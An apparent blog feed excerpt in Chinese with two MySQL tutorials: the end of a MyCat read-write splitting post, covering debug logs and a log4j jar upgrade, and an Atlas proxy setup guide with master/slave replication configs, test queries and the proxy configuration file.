lastTime=1651943944189, user=root, schema=ha, old shema=ha, borrowed=true, fromSlaveDB=true, threadId=15, charset=utf8, txIsolation=3, autocommit=true, attachment=dn1{select * from test}, respHandler=SingleNodeHandler [node=dn1{select * from test}, packetId=6], host=192.168.73.22, port=3306, statusSync=null, writeQueue=0, modifiedSQLExecuted=false]2022-05-08 01:22:56.420 DEBUG [$_NIOREACTOR-0-RW] (io.mycat.server.NonBlockingSession.releaseConnection(NonBlockingSession.java:386)) - release connection MySQLConnection [id=10, lastTime=1651944176407, user=root, schema=ha, old shema=ha, borrowed=true, fromSlaveDB=false, threadId=23, charset=utf8, txIsolation=3, autocommit=true, attachment=dn1{insert into test values (2,&apos;superman&apos;)}, respHandler=SingleNodeHandler [node=dn1{insert into test values (2,&apos;superman&apos;)}, packetId=1], host=192.168.73.21, port=3306, statusSync=null, writeQueue=0, modifiedSQLExecuted=true]2022-05-08 01:36:04.542 DEBUG [$_NIOREACTOR-0-RW] (io.mycat.server.NonBlockingSession.execute(NonBlockingSession.java:126)) - ServerConnection [id=3, schema=ha, host=192.168.73.20, user=root,txIsolation=3, autocommit=true, schema=ha, executeSql=insert into test values (2,&apos;superman&apos;)]insert into test values (2,&apos;superman&apos;), route={   1 -&gt; dn1{insert into test values (2,&apos;superman&apos;)}} rrs2022-05-08 01:36:04.542 DEBUG [$_NIOREACTOR-0-RW] (io.mycat.backend.mysql.nio.handler.SingleNodeHandler.execute(SingleNodeHandler.java:170)) - rrs.getRunOnSlave() default2022-05-08 01:36:04.542 DEBUG [$_NIOREACTOR-0-RW] (io.mycat.backend.mysql.nio.handler.SingleNodeHandler.execute(SingleNodeHandler.java:172)) - node.getRunOnSlave()  default2022-05-08 01:36:04.542 DEBUG [$_NIOREACTOR-0-RW] (io.mycat.backend.mysql.nio.handler.SingleNodeHandler.execute(SingleNodeHandler.java:182)) - node.getRunOnSlave() null2022-05-08 01:36:04.542 DEBUG [$_NIOREACTOR-0-RW] (io.mycat.backend.mysql.nio.handler.SingleNodeHandler.execute(SingleNodeHandler.java:184)) - node.getRunOnSlave() null2022-05-08 01:36:04.542 DEBUG [$_NIOREACTOR-0-RW] (io.mycat.backend.datasource.PhysicalDBNode.getConnection(PhysicalDBNode.java:102)) - rrs.getRunOnSlave()  default2022-05-08 01:36:04.542 DEBUG [$_NIOREACTOR-0-RW] (io.mycat.backend.datasource.PhysicalDBNode.getConnection(PhysicalDBNode.java:133)) - rrs.getRunOnSlave()  default2022-05-08 01:36:04.554 DEBUG [$_NIOREACTOR-0-RW] (io.mycat.server.NonBlockingSession.releaseConnection(NonBlockingSession.java:386)) - release connection MySQLConnection [id=10, lastTime=1651944964528, user=root, schema=ha, old shema=ha, borrowed=true, fromSlaveDB=false, threadId=23, charset=utf8, txIsolation=3, autocommit=true, attachment=dn1{insert into test values (2,&apos;superman&apos;)}, respHandler=SingleNodeHandler [node=dn1{insert into test values (2,&apos;superman&apos;)}, packetId=1], host=192.168.73.21, port=3306, statusSync=null, writeQueue=0, modifiedSQLExecuted=true]2022-05-08 01:36:04.554 DEBUG [$_NIOREACTOR-0-RW] (io.mycat.backend.datasource.PhysicalDatasource.releaseChannel(PhysicalDatasource.java:633)) - release channel MySQLConnection [id=10, lastTime=1651944964528, user=root, schema=ha, old shema=ha, borrowed=true, fromSlaveDB=false, threadId=23, charset=utf8, txIsolation=3, autocommit=true, attachment=null, respHandler=null, host=192.168.73.21, port=3306, statusSync=null, writeQueue=0, modifiedSQLExecuted=false]2022-05-08 01:36:40.600 DEBUG [$_NIOREACTOR-0-RW] (io.mycat.backend.datasource.PhysicalDBPool.getRWBanlanceCon(PhysicalDBPool.java:551)) - select read source rhel_sqlsrv for dataHost:dthost2022-05-08 01:36:40.601 DEBUG [$_NIOREACTOR-0-RW] (io.mycat.server.NonBlockingSession.releaseConnection(NonBlockingSession.java:386)) - release connection MySQLConnection [id=17, lastTime=1651945000587, user=root, schema=ha, old shema=ha, borrowed=true, fromSlaveDB=true, threadId=20, charset=utf8, txIsolation=3, autocommit=true, attachment=dn1{select * from test}, respHandler=SingleNodeHandler [node=dn1{select * from test}, packetId=10], host=192.168.73.22, port=3306, statusSync=null, writeQueue=0, modifiedSQLExecuted=false]2022-05-08 01:53:32.188 DEBUG [Timer0] (io.mycat.sqlengine.SQLJob.connectionAcquired(SQLJob.java:89)) - con query sql:select user() to con:MySQLConnection [id=1, lastTime=1651946012188, user=root, schema=ha, old shema=ha, borrowed=true, fromSlaveDB=false, threadId=22, charset=utf8, txIsolation=3, autocommit=true, attachment=null, respHandler=null, host=192.168.73.21, port=3306, statusSync=null, writeQueue=0, modifiedSQLExecuted=false]2022-05-08 01:53:32.188 DEBUG [Timer0] (io.mycat.sqlengine.SQLJob.connectionAcquired(SQLJob.java:89)) - con query sql:select user() to con:MySQLConnection [id=14, lastTime=1651946012188, user=root, schema=ha, old shema=ha, borrowed=true, fromSlaveDB=true, threadId=18, charset=utf8, txIsolation=3, autocommit=true, attachment=null, respHandler=null, host=192.168.73.22, port=3306, statusSync=null, writeQueue=0, modifiedSQLExecuted=false]</code></pre><p>&#x8BFB;&#x64CD;&#x4F5C;&#x662F;&#x5728;Slave 192.168.73.22&#x4E0A;&#x8FDB;&#x884C;&#x7684;</p><p>&#x5199;&#x64CD;&#x4F5C;&#x662F;&#x5728;Master 192.168.73.21&#x4E0A;&#x8FDB;&#x884C;&#x7684;</p><h2 id="&#x66FF;&#x6362;log4j"><a href="#&#x66FF;&#x6362;log4j" class="headerlink" title="&#x66FF;&#x6362;log4j"></a>&#x66FF;&#x6362;log4j</h2><p>&#x53C2;&#x8003;&#xFF1A;<a href="https://www.yuque.com/ccazhw/tuacvk/doq6pc" target="_blank" rel="noopener">https://www.yuque.com/ccazhw/tuacvk/doq6pc</a></p><p>log4j-2.15-jar&#x5305;&#xFF0C;&#x66FF;&#x6362;&#x5373;&#x53EF;&#xFF0C;&#x6700;&#x65B0;&#x7684;log4j&#x7684;jar&#x8BF7;&#x5230;&#x963F;&#x91CC;&#x4E91;maven&#x4ED3;&#x5E93;&#x4E0B;&#x8F7D;</p><ol><li>&#x66FF;&#x6362;log4j&#x4E3A;log4j-1.15,1.15&#x524D;&#x7684;&#x7248;&#x672C;&#x6709;&#x6F0F;&#x6D1E;<pre><code class="shell">[root@ctos7mini mycat]&amp; ll ./lib/log4j*-rwxrwxrwx. 1 mycat mycat  489884 Sep 27  2019 ./lib/log4j-1.2.17.jar-rwxrwxrwx. 1 mycat mycat   36947 Sep 27  2019 ./lib/log4j-1.2-api-2.5.jar-rwxrwxrwx. 1 mycat mycat  146761 Sep 27  2019 ./lib/log4j-api-2.5.jar-rwxrwxrwx. 1 mycat mycat 1106090 Sep 27  2019 ./lib/log4j-core-2.5.jar-rwxrwxrwx. 1 mycat mycat   22935 Sep 27  2019 ./lib/log4j-slf4j-impl-2.5.jar[root@ctos7mini mycat]#</code></pre>&#x5220;&#x6389;<code>log4j-1.2.17.jar</code>&#xFF0C;<br>&#x66FF;&#x6362;lib&#x6587;&#x4EF6;&#x5939;&#x4E0A;&#x8FF0;&#x7684;4&#x4E2A;&#x6587;&#x4EF6;,&#x66FF;&#x6362;&#x4E3A;&#x4E0B;&#x9762;4&#x4E2A;&#x6587;&#x4EF6; </li></ol><p>&#x5B83;&#x4EEC;&#x7684;&#x4E0B;&#x8F7D;&#x5730;&#x5740;&#x662F;<br><a href="https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-1.2-api" target="_blank" rel="noopener">https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-1.2-api</a><br><a href="https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-api" target="_blank" rel="noopener">https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-api</a><br><a href="https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-core" target="_blank" rel="noopener">https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-core</a><br><a href="https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-slf4j-impl" target="_blank" rel="noopener">https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-slf4j-impl</a>  </p><p>&#x8FD9;&#x662F;&#x7F13;&#x5B58;&#x4E0B;&#x6765;&#x7684;&#x6253;&#x5305;&#x597D;&#x7684;,&#x4E0D;&#x4FDD;&#x8BC1;&#x6700;&#x65B0;<br><a href="http://dl.mycat.org.cn/1.6.7.6/20211221142218/log4j-2.17.zip" target="_blank" rel="noopener">http://dl.mycat.org.cn/1.6.7.6/20211221142218/log4j-2.17.zip</a></p><h2 id="MyCat&#x6545;&#x969C;&#x89E3;&#x51B3;"><a href="#MyCat&#x6545;&#x969C;&#x89E3;&#x51B3;" class="headerlink" title="MyCat&#x6545;&#x969C;&#x89E3;&#x51B3;"></a>MyCat&#x6545;&#x969C;&#x89E3;&#x51B3;</h2><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;MySQL&amp;#x6570;&amp;#x636E;&amp;#x5E93;&amp;#x9AD8;&amp;#x7EA7;&amp;#x5E94;&amp;#x7528;&amp;#x4E4B;&amp;#x8BFB;&amp;#x5199;&amp;#x5206;&amp;#x79BB;&amp;#x2014;&amp;#x2014;MyCat&amp;#x7BC7;&quot;&gt;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Atlas实现MySQL读写分离</title>
    <link href="https://marnm.github.io//posts/62ec7971/"/>
    <id>https://marnm.github.io//posts/62ec7971/</id>
    <published>2022-06-07T04:45:45.000Z</published>
    <updated>2022-06-07T05:11:47.471Z</updated>
    
    <content type="html"><![CDATA[<h2 id="MySQL-Atlas-&#x2014;-&#x8BFB;&#x5199;&#x5206;&#x79BB;&#x5B9E;&#x6218;"><a href="#MySQL-Atlas-&#x2014;-&#x8BFB;&#x5199;&#x5206;&#x79BB;&#x5B9E;&#x6218;" class="headerlink" title="MySQL + Atlas &#x2014; &#x8BFB;&#x5199;&#x5206;&#x79BB;&#x5B9E;&#x6218;"></a>MySQL + Atlas &#x2014; &#x8BFB;&#x5199;&#x5206;&#x79BB;&#x5B9E;&#x6218;</h2><ol><li>&#x6570;&#x636E;&#x5E93;&#x7528;&#x6237;&#x914D;&#x7F6E;</li><li>&#x4E3B;&#x4ECE;&#x6570;&#x636E;&#x5E93;&#x914D;&#x7F6E;</li><li>Atlas&#x914D;&#x7F6E;</li><li>&#x8BFB;&#x5199;&#x5206;&#x79BB;&#x6D4B;&#x8BD5;</li></ol><p><strong>&#x5E8F;&#x7AE0;</strong><br>Atlas&#x662F;360&#x56E2;&#x961F;&#x5F04;&#x51FA;&#x6765;&#x7684;&#x4E00;&#x5957;&#x57FA;&#x4E8E;MySQL-Proxy&#x57FA;&#x7840;&#x4E4B;&#x4E0A;&#x7684;&#x4EE3;&#x7406;&#xFF0C;&#x4FEE;&#x6539;&#x4E86;MySQL-Proxy&#x7684;&#x4E00;&#x4E9B;BUG&#xFF0C;&#x5E76;&#x4E14;&#x4F18;&#x5316;&#x4E86;&#x5F88;&#x591A;&#x4E1C;&#x897F;&#x3002;&#x800C;&#x4E14;&#x5B89;&#x88C5;&#x65B9;&#x4FBF;&#x3002;&#x914D;&#x7F6E;&#x7684;&#x6CE8;&#x91CA;&#x5F88;&#x8BE6;&#x7EC6;&#xFF0C;&#x90FD;&#x662F;&#x4E2D;&#x6587;&#x3002;&#x82F1;&#x6587;&#x4E0D;&#x597D;&#x7684;&#x540C;&#x5B66;&#x6709;&#x798F;&#x4E86;&#x3002;<br>Atlas&#x5B98;&#x65B9;&#x94FE;&#x63A5;&#xFF1A; <a href="https://github.com/Qihoo360/Atlas/blob/master/README_ZH.md" target="_blank" rel="noopener">https://github.com/Qihoo360/Atlas/blob/master/README_ZH.md</a><br>Atlas&#x4E0B;&#x8F7D;&#x94FE;&#x63A5;&#xFF1A; <a href="https://github.com/Qihoo360/Atlas/releases" target="_blank" rel="noopener">https://github.com/Qihoo360/Atlas/releases</a>  </p><p>&#x73AF;&#x5883;&#xFF1A;</p><table><thead><tr><th>&#x7CFB;&#x7EDF;</th><th>IP</th><th>&#x89D2;&#x8272;</th></tr></thead><tbody><tr><td>CentOS7.4</td><td>192.168.73.20</td><td>Atlas&#x4EE3;&#x7406;&#x670D;&#x52A1;</td></tr><tr><td>RHEL 7.3</td><td>192.168.73.21</td><td>MySQL_Master</td></tr><tr><td>RHEL 7.3</td><td>192.168.73.22</td><td>MySQL_Slave</td></tr></tbody></table><p><strong>&#x6CE8;&#x610F;&#xFF1A;</strong>&#x4E09;&#x53F0;&#x670D;&#x52A1;&#x5668;&#x90FD;&#x8981;&#x5B89;&#x88C5;MySQL&#x6570;&#x636E;&#xFF01;</p><h2 id="MySQL-Master"><a href="#MySQL-Master" class="headerlink" title="MySQL Master"></a>MySQL Master</h2><pre><code class="ini">[mysqld]datadir=/var/lib/mysqlsocket=/var/lib/mysql/mysql.socksymbolic-links=0log-error=/var/log/mysqld.logpid-file=/var/run/mysqld/mysqld.pidbind-address    = 0.0.0.0user=mysqlinnodb_flush_log_at_trx_commit=1sync_binlog=1log-bin=mysql-binserver-id=1binlog-do-db=testdbbinlog-ignore-db=mysqlskip-name-resolvegeneral_log=ONgeneral_log_file= /var/lib/mysql/rhel_sqlsrv.log</code></pre><pre><code class="sql">CREATE DATABASE testdb DEFAULT CHARACTER SET utf8 COLLATE utf8_general_ci;mysql&gt; grant replication slave on *.* to root@&apos;%&apos; identified by &apos;ccc.456&apos;;Query OK, 0 rows affected, 1 warning (0.01 sec)mysql&gt; select user,host from mysql.user;+---------------+--------------+| user          | host         |+---------------+--------------+| root          | %            || slave         | 192.168.73.% || mysql.session | localhost    || mysql.sys     | localhost    || root          | localhost    |+---------------+--------------+5 rows in set (0.00 sec)mysql&gt;mysql&gt; show master status;+------------------+----------+--------------+------------------+-------------------+| File             | Position | Binlog_Do_DB | Binlog_Ignore_DB | Executed_Gtid_Set |+------------------+----------+--------------+------------------+-------------------+| mysql-bin.000003 |     1605 | testdb       | mysql            |                   |+------------------+----------+--------------+------------------+-------------------+1 row in set (0.00 sec)mysql&gt;</code></pre><pre><code class="shell">[root@rhel7 ~]&amp; mysqldump -uroot -p -B testdb &gt; testdb.sqlEnter password:[root@rhel7 ~]&amp; lsanaconda-ks.cfg  ha.sql  mysql_master_ha  rpm_mysql5.7  testdb.sql[root@rhel7 ~]&amp; scp testdb.sql root@192.168.73.22:~testdb.sql                                                 100% 2126     2.1KB/s   00:00[root@rhel7 ~]&amp;</code></pre><h2 id="MySQL-Slave"><a href="#MySQL-Slave" class="headerlink" title="MySQL Slave"></a>MySQL Slave</h2><pre><code class="ini">[mysqld]datadir=/var/lib/mysqlsocket=/var/lib/mysql/mysql.socksymbolic-links=0log-error=/var/log/mysqld.logpid-file=/var/run/mysqld/mysqld.pidbind-address    = 0.0.0.0log-bin=mysql-slave2server-id=3binlog-ignore-db=mysqllog_slave_updates=1skip-name-resolvegeneral_log=ONgeneral_log_file=/var/lib/mysql/rhel_sqlsrv.log</code></pre><pre><code class="sql">mysql&gt; change master to master_host=&apos;192.168.73.21&apos;, master_user=&apos;root&apos;,master_password=&apos;ccc.456&apos;,master_port=3306,master_log_file=&apos;mysql-bin.000003&apos;,master_log_pos=1605,master_connect_retry=10;Query OK, 0 rows affected, 2 warnings (0.00 sec)mysql&gt; start slave;Query OK, 0 rows affected (0.00 sec)mysql&gt; show slave status\G*************************** 1. row ***************************               Slave_IO_State: Waiting for master to send event                  Master_Host: 192.168.73.21                  Master_User: root                  Master_Port: 3306                Connect_Retry: 10              Master_Log_File: mysql-bin.000003          Read_Master_Log_Pos: 1605               Relay_Log_File: rhel_sqlsrv-relay-bin.000002                Relay_Log_Pos: 320        Relay_Master_Log_File: mysql-bin.000003             Slave_IO_Running: Yes            Slave_SQL_Running: Yes              Replicate_Do_DB:.........................................&#x7701;&#x7565;...................................................................             Master_Server_Id: 1                  Master_UUID: 8f5a42da-cd2d-11ec-8c02-000c29f9275c             Master_Info_File: /var/lib/mysql/master.info                    SQL_Delay: 0          SQL_Remaining_Delay: NULL      Slave_SQL_Running_State: Slave has read all relay log; waiting for more updates           Master_Retry_Count: 86400                  Master_Bind:.........................................&#x7701;&#x7565;...................................................................1 row in set (0.00 sec)mysql&gt;</code></pre><pre><code class="shell">[root@rhel_sqlsrv ~]&amp; mysql -uroot -p &lt; testdb.sqlEnter password:[root@rhel_sqlsrv ~]&amp;</code></pre><h2 id="&#x6D4B;&#x8BD5;&#x4E3B;&#x4ECE;&#x540C;&#x6B65;"><a href="#&#x6D4B;&#x8BD5;&#x4E3B;&#x4ECE;&#x540C;&#x6B65;" class="headerlink" title="&#x6D4B;&#x8BD5;&#x4E3B;&#x4ECE;&#x540C;&#x6B65;"></a>&#x6D4B;&#x8BD5;&#x4E3B;&#x4ECE;&#x540C;&#x6B65;</h2><p><strong>Master</strong></p><pre><code class="sql">Database changedmysql&gt; insert into book values(&apos;abc&apos;,123,456);Query OK, 1 row affected (0.00 sec)mysql&gt;</code></pre><p><strong>Slave</strong></p><pre><code class="sql">mysql&gt; select * from book;+-------------------------+-------+-------+| name                    | price | pages |+-------------------------+-------+-------+| Linux                   |    30 |   666 || Cloud Computing         |    60 |   666 || Operation System        |    80 |   666 || Artificial Intelligence |   166 |   666 || Linux                   |    66 |   666 || Unix                    |    77 |   777 || abc                     |   123 |   456 |+-------------------------+-------+-------+7 rows in set (0.00 sec)mysql&gt;</code></pre><h2 id="Atlas&#x914D;&#x7F6E;"><a href="#Atlas&#x914D;&#x7F6E;" class="headerlink" title="Atlas&#x914D;&#x7F6E;"></a>Atlas&#x914D;&#x7F6E;</h2><p><strong>&#x5B89;&#x88C5;Atlas</strong></p><pre><code class="shell">[root@ctos7mini ~]&amp; rpm -ivh Atlas-2.2.1.el6.x86_64.rpmPreparing...                          ################################# [100%]Updating / installing...   1:Atlas-2.2.1-1                    ################################# [100%][root@ctos7mini ~]&amp;</code></pre><pre><code class="mbox">[root@ctos7mini ~]&amp; ll /usr/local/mysql-proxy/ -R/usr/local/mysql-proxy/:total 4drwxr-xr-x. 2 root root   75 May  7 04:33 bindrwxr-xr-x. 2 root root   22 May  7 04:33 confdrwxr-xr-x. 3 root root 4096 May  7 04:33 libdrwxr-xr-x. 2 root root    6 Dec 17  2014 log/usr/local/mysql-proxy/bin:total 44-rwxr-xr-x. 1 root root  9696 Dec 17  2014 encrypt-rwxr-xr-x. 1 root root 23564 Dec 17  2014 mysql-proxy-rwxr-xr-x. 1 root root  1552 Dec 17  2014 mysql-proxyd-rw-r--r--. 1 root root     6 Dec 17  2014 VERSION/usr/local/mysql-proxy/conf:total 4-rw-r--r--. 1 root root 2810 Dec 17  2014 test.cnf/usr/local/mysql-proxy/lib:total 9812-rwxr-xr-x. 1 root root  968655 Dec 17  2014 libevent-2.0.so.5-rwxr-xr-x. 1 root root 3464668 Dec 17  2014 libglib-2.0.so.0-rwxr-xr-x. 1 root root   35483 Dec 17  2014 libgmodule-2.0.so.0-rwxr-xr-x. 1 root root    8656 Dec 17  2014 libgthread-2.0.so.0-rwxr-xr-x. 1 root root 5021619 Dec 17  2014 libjemalloc.so.1-rwxr-xr-x. 1 root root  172984 Dec 17  2014 liblua-5.1.so-rwxr-xr-x. 1 root root   14735 Dec 17  2014 libmysql-chassis-glibext.so.0-rwxr-xr-x. 1 root root   73823 Dec 17  2014 libmysql-chassis.so.0-rwxr-xr-x. 1 root root   14446 Dec 17  2014 libmysql-chassis-timing.so.0-rwxr-xr-x. 1 root root  180107 Dec 17  2014 libmysql-proxy.so.0-rwxr-xr-x. 1 root root   71566 Dec 17  2014 libsql-tokenizer.so.0drwxr-xr-x. 4 root root      32 May  7 04:33 mysql-proxy/usr/local/mysql-proxy/lib/mysql-proxy:total 0drwxr-xr-x. 3 root root 162 May  7 04:33 luadrwxr-xr-x. 2 root root  44 May  7 04:33 plugins/usr/local/mysql-proxy/lib/mysql-proxy/lua:total 240-rw-r--r--. 1 root root   9387 Dec 17  2014 admin.lua-rwxr-xr-x. 1 root root  15966 Dec 17  2014 chassis.so-rwxr-xr-x. 1 root root   8988 Dec 17  2014 crc32.so-rwxr-xr-x. 1 root root   9416 Dec 17  2014 glib2.so-rwxr-xr-x. 1 root root  18323 Dec 17  2014 lfs.so-rwxr-xr-x. 1 root root  43879 Dec 17  2014 lpeg.so-rwxr-xr-x. 1 root root 102944 Dec 17  2014 mysql.so-rwxr-xr-x. 1 root root   9248 Dec 17  2014 posix.sodrwxr-xr-x. 2 root root    243 May  7 04:33 proxy-rwxr-xr-x. 1 root root   6626 Dec 17  2014 time.so/usr/local/mysql-proxy/lib/mysql-proxy/lua/proxy:total 80-rw-r--r--. 1 root root   536 Dec 17  2014 auth.lua-rw-r--r--. 1 root root  6670 Dec 17  2014 auto-config.lua-rw-r--r--. 1 root root  2807 Dec 17  2014 balance.lua-rw-r--r--. 1 root root  2873 Dec 17  2014 charset.lua-rw-r--r--. 1 root root  3477 Dec 17  2014 commands.lua-rw-r--r--. 1 root root   238 Dec 17  2014 crc32.lua-rw-r--r--. 1 root root  1906 Dec 17  2014 filter.lua-rw-r--r--. 1 root root  2706 Dec 17  2014 log.lua-rw-r--r--. 1 root root  6105 Dec 17  2014 parser.lua-rw-r--r--. 1 root root 14816 Dec 17  2014 split.lua-rw-r--r--. 1 root root  6366 Dec 17  2014 test.lua-rw-r--r--. 1 root root   106 Dec 17  2014 ticker.lua-rw-r--r--. 1 root root  6215 Dec 17  2014 tokenizer.lua#&#x65E5;&#x5FD7;&#x7EA7;&#x522B;&#xFF0C;&#x5206;&#x4E3A;message&#x3001;warning&#x3001;critical&#x3001;error&#x3001;debug&#x4E94;&#x4E2A;&#x7EA7;&#x522B;/usr/local/mysql-proxy/lib/mysql-proxy/plugins:total 4920-rwxr-xr-x. 1 root root   21134 Dec 17  2014 libadmin.so-rwxr-xr-x. 1 root root 5011799 Dec 17  2014 libproxy.so/usr/local/mysql-proxy/log:total 0</code></pre><p><strong>bin&#x76EE;&#x5F55;&#x4E0B;&#x653E;&#x7684;&#x90FD;&#x662F;&#x53EF;&#x6267;&#x884C;&#x6587;&#x4EF6;</strong></p><ol><li>&#x201C;encrypt&#x201D;&#x662F;&#x7528;&#x6765;&#x5BF9;MySQL&#x5BC6;&#x7801;&#x8FDB;&#x884C;&#x52A0;&#x5BC6;&#x7684;&#xFF0C;&#x5728;&#x914D;&#x7F6E;&#x7684;&#x65F6;&#x5019;&#x4F1A;&#x7528;&#x5230;</li><li>&#x201C;mysql-proxy&#x201D;&#x662F;MySQL&#x81EA;&#x5DF1;&#x7684;&#x8BFB;&#x5199;&#x5206;&#x79BB;&#x4EE3;&#x7406;</li><li>&#x201C;mysql-proxyd&#x201D;&#x662F;360&#x5F04;&#x51FA;&#x6765;&#x7684;&#xFF0C;&#x540E;&#x9762;&#x6709;&#x4E2A;&#x201C;d&#x201D;&#xFF0C;&#x670D;&#x52A1;&#x7684;&#x542F;&#x52A8;&#x3001;&#x91CD;&#x542F;&#x3001;&#x505C;&#x6B62;&#xFF0C;&#x90FD;&#x662F;&#x7528;&#x4ED6;&#x6765;&#x6267;&#x884C;&#x7684;</li></ol><p><strong>conf&#x76EE;&#x5F55;&#x4E0B;&#x653E;&#x7684;&#x662F;&#x914D;&#x7F6E;&#x6587;&#x4EF6;</strong></p><ol><li>&#x201C;test.cnf&#x201D;&#x53EA;&#x6709;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;&#xFF0C;&#x7528;&#x6765;&#x914D;&#x7F6E;&#x4EE3;&#x7406;&#x7684;&#xFF0C;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;vim&#x6765;&#x7F16;&#x8F91;</li><li>lib&#x76EE;&#x5F55;&#x4E0B;&#x653E;&#x7684;&#x662F;&#x4E00;&#x4E9B;&#x5305;&#xFF0C;&#x4EE5;&#x53CA;Atlas&#x7684;&#x4F9D;&#x8D56;</li><li>log&#x76EE;&#x5F55;&#x4E0B;&#x653E;&#x7684;&#x662F;&#x65E5;&#x5FD7;&#xFF0C;&#x5982;&#x62A5;&#x9519;&#x7B49;&#x9519;&#x8BEF;&#x4FE1;&#x606F;&#x7684;&#x8BB0;&#x5F55;</li></ol><p>&#x8FDB;&#x5165;bin&#x76EE;&#x5F55;&#xFF0C;&#x4F7F;&#x7528;encrypt&#x6765;&#x5BF9;&#x6570;&#x636E;&#x5E93;&#x7684;&#x5BC6;&#x7801;&#x8FDB;&#x884C;&#x52A0;&#x5BC6;&#xFF0C;&#x6211;&#x7684;MySQL&#x6570;&#x636E;&#x7684;&#x7528;&#x6237;&#x540D;&#x662F;root&#xFF0C;&#x5BC6;&#x7801;&#x662F;123456&#xFF0C;&#x6211;&#x9700;&#x8981;&#x5BF9;&#x5BC6;&#x7801;&#x8FDB;&#x884C;&#x52A0;&#x5BC6;</p><pre><code class="shell">[root@ctos7mini ~]&amp; cd /usr/local/mysql-proxy/[root@ctos7mini mysql-proxy]&amp; ./bin/encrypt 123456/iZxz+0GRoA=</code></pre><p><strong>&#x914D;&#x7F6E;Atlas&#xFF0C;&#x4F7F;&#x7528;vim&#x8FDB;&#x884C;&#x7F16;&#x8F91;</strong></p><pre><code class="shell">[root@ctos7mini ~]&amp; cat /usr/local/mysql-proxy/conf/test.cnf[mysql-proxy]#&#x5E26;#&#x53F7;&#x7684;&#x4E3A;&#x975E;&#x5FC5;&#x9700;&#x7684;&#x914D;&#x7F6E;&#x9879;&#x76EE;#&#x7BA1;&#x7406;&#x63A5;&#x53E3;&#x7684;&#x7528;&#x6237;&#x540D;admin-username = root#&#x7BA1;&#x7406;&#x63A5;&#x53E3;&#x7684;&#x5BC6;&#x7801;admin-password = pwd#Atlas&#x540E;&#x7AEF;&#x8FDE;&#x63A5;&#x7684;MySQL&#x4E3B;&#x5E93;&#x7684;IP&#x548C;&#x7AEF;&#x53E3;&#xFF0C;&#x53EF;&#x8BBE;&#x7F6E;&#x591A;&#x9879;&#xFF0C;&#x7528;&#x9017;&#x53F7;&#x5206;&#x9694;proxy-backend-addresses = 192.168.73.21:3306#Atlas&#x540E;&#x7AEF;&#x8FDE;&#x63A5;&#x7684;MySQL&#x4ECE;&#x5E93;&#x7684;IP&#x548C;&#x7AEF;&#x53E3;&#xFF0C;@&#x540E;&#x9762;&#x7684;&#x6570;&#x5B57;&#x4EE3;&#x8868;&#x6743;&#x91CD;&#xFF0C;&#x7528;&#x6765;&#x4F5C;&#x8D1F;&#x8F7D;&#x5747;&#x8861;&#xFF0C;&#x82E5;&#x7701;&#x7565;&#x5219;&#x9ED8;&#x8BA4;&#x4E3A;1&#xFF0C;&#x53EF;&#x8BBE;&#x7F6E;&#x591A;&#x9879;&#xFF0C;&#x7528;&#x9017;&#x53F7;&#x5206;&#x9694;proxy-read-only-backend-addresses = 192.168.73.22:3306@1#&#x7528;&#x6237;&#x540D;&#x4E0E;&#x5176;&#x5BF9;&#x5E94;&#x7684;&#x52A0;&#x5BC6;&#x8FC7;&#x7684;MySQL&#x5BC6;&#x7801;&#xFF0C;&#x5BC6;&#x7801;&#x4F7F;&#x7528;PREFIX/bin&#x76EE;&#x5F55;&#x4E0B;&#x7684;&#x52A0;&#x5BC6;&#x7A0B;&#x5E8F;encrypt&#x52A0;&#x5BC6;&#xFF0C;&#x4E0B;&#x884C;&#x7684;user1&#x548C;user2&#x4E3A;&#x793A;&#x4F8B;&#xFF0C;&#x5C06;&#x5176;&#x66FF;&#x6362;&#x4E3A;&#x4F60;&#x7684;MySQL&#x7684;&#x7528;&#x6237;&#x540D;&#x548C;&#x52A0;&#x5BC6;&#x5BC6;&#x7801;&#xFF01;pwds = root:/iZxz+0GRoA=#&#x8BBE;&#x7F6E;Atlas&#x7684;&#x8FD0;&#x884C;&#x65B9;&#x5F0F;&#xFF0C;&#x8BBE;&#x4E3A;true&#x65F6;&#x4E3A;&#x5B88;&#x62A4;&#x8FDB;&#x7A0B;&#x65B9;&#x5F0F;&#xFF0C;&#x8BBE;&#x4E3A;false&#x65F6;&#x4E3A;&#x524D;&#x53F0;&#x65B9;&#x5F0F;&#xFF0C;&#x4E00;&#x822C;&#x5F00;&#x53D1;&#x8C03;&#x8BD5;&#x65F6;&#x8BBE;&#x4E3A;false&#xFF0C;&#x7EBF;&#x4E0A;&#x8FD0;&#x884C;&#x65F6;&#x8BBE;&#x4E3A;true,true&#x540E;&#x9762;&#x4E0D;&#x80FD;&#x6709;&#x7A7A;&#x683C;&#x3002;daemon = 